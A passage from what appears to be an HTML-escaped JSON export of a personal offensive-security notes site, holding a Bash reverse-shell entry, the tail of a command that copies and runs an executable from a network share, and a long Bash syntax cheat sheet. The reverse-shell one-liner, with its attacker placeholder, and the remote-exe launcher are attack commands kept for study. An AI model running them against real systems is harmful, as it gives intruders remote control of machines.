style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.Run &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;cmd.exe /c copy /Y \\\\$SHARE_NAME\\$SHARE_PATH\\$MALICIOUS_EXE %TEMP% &amp;#x26; %TEMP%\\$MALICIOUS_EXE $OPTIONAL_ARGUMENTS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; True&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Bash-reverse-shell":{"slug":"spells/Bash-reverse-shell","filePath":"spells/Bash reverse shell.md","title":"Bash reverse shell","links":["spells/netcat","spells/socat","spells/UNIX-file-descriptors"],"tags":["Language/Bash","AttackCycle/LateralMovement","Application/netcat","Application/socat"],"content":"bash -li &amp;&gt; /dev/tcp/$ATTACKER_IP/$LISTENER_PORT 0&gt;&amp;1\n(Based on the PayloadsAllTheThings Bash TCP reverse shell.)\nCatch it with netcat or socat.\n(That said, the fact that all of my file descriptors wind up pointing at /dev/tcp is a little mysterious to me. I think what’s happening here is that /dev/tcp is bidirectional “out of the box” — incoming data comes out, just as outgoing data goes in — so binding all three “core” file descriptors to it does the right thing. That, and realize that the X&gt;&amp;Y construct means “bind file descriptor X to file descriptor Y”, and &amp;&gt; is just short for 2&gt;&amp;1 &gt;, and &gt; is just short for 1 &gt;. So really what’s happening here is that we bind STDERR to STDOUT with and implicit 2&gt;&amp;1, then bind STDOUT to /dev/tcp with an implicit 1 &gt;, then bind STDIN to /dev/tcp as well with 0&gt;&amp;1.)","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;bash&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -li&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; &amp;#x26;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; /dev/tcp/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$LISTENER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; 0&gt;&amp;#x26;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;(Based on the &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;PayloadsAllTheThings Bash TCP reverse shell&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.)&lt;/p&gt;\n&lt;p&gt;Catch it with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/socat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/socat&quot;&gt;socat&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;(That said, the fact that all of my &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UNIX-file-descriptors&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UNIX-file-descriptors&quot;&gt;file descriptors&lt;/a&gt; wind up pointing at /dev/tcp is a little mysterious to me. I &lt;em&gt;think&lt;/em&gt; what’s happening here is that /dev/tcp is bidirectional “out of the box” — incoming data comes out, just as outgoing data goes in — so binding all three “core” &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UNIX-file-descriptors&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UNIX-file-descriptors&quot;&gt;file descriptors&lt;/a&gt; to it does the right thing. That, and realize that the &lt;code&gt;X&gt;&amp;#x26;Y&lt;/code&gt; construct means “bind &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UNIX-file-descriptors&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UNIX-file-descriptors&quot;&gt;file descriptor&lt;/a&gt; X to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UNIX-file-descriptors&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UNIX-file-descriptors&quot;&gt;file descriptor&lt;/a&gt; Y”, and &lt;code&gt;&amp;#x26;&gt;&lt;/code&gt; is just short for &lt;code&gt;2&gt;&amp;#x26;1 &gt;&lt;/code&gt;, and &lt;code&gt;&gt;&lt;/code&gt; is just short for &lt;code&gt;1 &gt;&lt;/code&gt;. So really what’s happening here is that we bind STDERR to STDOUT with and implicit &lt;code&gt;2&gt;&amp;#x26;1&lt;/code&gt;, then bind STDOUT to /dev/tcp with an implicit &lt;code&gt;1 &gt;&lt;/code&gt;, then bind STDIN to /dev/tcp as well with &lt;code&gt;0&gt;&amp;#x26;1&lt;/code&gt;.)&lt;/p&gt;"},"spells/Bash-scripting":{"slug":"spells/Bash-scripting","filePath":"spells/Bash scripting.md","title":"Bash scripting","links":[],"tags":["Language/Bash"],"content":"# Brace expansion\n#\n{X,Y}      # X Y\n{X,Y}.txt  # X.txt Y.txt\n{1..10}    # 1 2 3 4 5 6 7 8 9 10\n{1..10..2} # 1 3 5 7 9\n \n# Special variables\n#\n$#   # Number of arguments to script/function\n$1   # First argument\n$9   # Ninth argument (NOTE: there is no $10 and higher)\n&quot;$@&quot; # All arguments as a separate quoted strings\n&quot;$*&quot; # All arguments as a single string separated by\n     # first IFS character\n \n# IFS is the string of characters that act as delimeters\n# (for example, in loops). If unset, it&#039;s equal to the\n# sequence &lt;space&gt;&lt;tab&gt;&lt;newline&gt;.\n \n# Length of a variable\n#\nMYVAR=/path/to/file/file.tar.gz\n${#MYVAR} # 25\n \n# Variable manipulation\n#\n${MYVAR%.*}            # /path/to/file/file.tar\n${MYVAR%%.*}           # /path/to/file/file\n${MYVAR#*/}            # path/to/file/file.tar.gz\n${MYVAR##*/}           # file.tar.gz\n${MYVAR/file/newfile}  # /path/to/newfile/file.tar.gz\n${MYVAR//file/newfile} # /path/to/newfile/newfile.tar.gz\n${MYVAR:1:4}           # path\n${MYVAR:(-6):3}        # tar\n \n# Setting defaults\n#\n${MYVAR:-default} # Return $MYVAR, or &quot;default&quot; if unset\n${MYVAR:=default} # Set $MYVAR to &quot;default&quot; if unset\n${MYVAR:+default} # Return &quot;default&quot; if $MYVAR set\n${MYVAR:?error}   # Exit with &quot;error&quot; if $MYVAR unset\n \n# Variable variables\n#\nVAR1=&quot;Hello world&quot;\nVAR2=&quot;VAR1&quot;\n${!VAR2} # Hello world\n \n# Arrays\n#\nMYARRAY=(&quot;element0&quot; &quot;element1&quot; &quot;element2&quot;)\nMYARRAY[3]=&quot;element3&quot;\n${MYARRAY[0]}     # element0\n${MYARRAY[-1]}    # element3\n${MYARRAY[@]}     # element0 element1 element2 element3\n${MYARRAY[@]:1:2} # element1 element2\n${!MYARRAY[@]}    # 0 1 2 3\n \n# Size of an array\n#\n${#MYARRAY[@]} # 4\n \n# Remove an element from an array\n#\nunset MYARRAY[3]\n \n# Arrays are actually a special case of dictionaries,\n# which hold key/value pairs. In an array, keys are just\n# 0-indexed numbers. Dictionaries work exactly the same\n# as arrays, except rather than referencing/setting\n# elements by number, you reference and set them by key.\n \n# Create a dictionary\n#\ndeclare -A MYDICT\n \n# Math\n#\n$(( 1 + 2 )) # 3\n$RANDOM      # Random-ish number\n \n# Loop over lines in a file\n#\ncat $FILE | while read -r LINE; do\n\t# Do stuff with $LINE\ndone\n \n# Loop over filenames with spaces\n#\nwhile IFS= read -d &#039;&#039; -r FILE; do\n\t# Do stuff with $FILE\ndone &lt; &lt;(find $DIR -type f -print0)\n \n# The advantage this has over other approaches is that it\n# doesn&#039;t create a subshell, so you can use variables set\n# within the loop elsewhere. We need to temporarily\n# override IFS because our list is null-separated; the\n# space between the -d and the &#039;&#039; (an empty string, which\n# Bash interprets as the null character) is *required*.","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Brace expansion&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;{X,Y}      # X Y&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;{X,Y}.txt  # X.txt Y.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;{1..10}    # 1 2 3 4 5 6 7 8 9 10&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;{1..10..2} # 1 3 5 7 9&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Special variables&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;$#&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;   # Number of arguments to script/function&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;   # First argument&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$9&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;   # Ninth argument (NOTE: there is no $10 and higher)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$@&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # All arguments as a separate quoted strings&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;$*&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # All arguments as a single string separated by&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;     # first IFS character&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# IFS is the string of characters that act as delimeters&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# (for example, in loops). If unset, it&#039;s equal to the&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# sequence &amp;#x3C;space&gt;&amp;#x3C;tab&gt;&amp;#x3C;newline&gt;.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Length of a variable&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYVAR&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/path/to/file/file.tar.gz&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYVAR&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # 25&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Variable manipulation&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYVAR&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;%&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;            # /path/to/file/file.tar&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYVAR&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;%%&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;           # /path/to/file/file&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYVAR&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;#*/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;            # path/to/file/file.tar.gz&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYVAR&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;##*/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;           # file.tar.gz&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYVAR&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;newfile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;  # /path/to/newfile/file.tar.gz&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYVAR&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;//&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;newfile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # /path/to/newfile/newfile.tar.gz&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYVAR&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;           # path&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYVAR&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;-6&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;3&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;        # tar&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Setting defaults&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYVAR&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;:-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;default&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # Return $MYVAR, or &quot;default&quot; if unset&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYVAR&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;:=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;default&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # Set $MYVAR to &quot;default&quot; if unset&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYVAR&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;default&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # Return &quot;default&quot; if $MYVAR set&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYVAR&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;:?&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;error&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;   # Exit with &quot;error&quot; if $MYVAR unset&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Variable variables&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;VAR1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Hello world&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;VAR2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;VAR1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;VAR2&lt;/span&gt;&lt;span 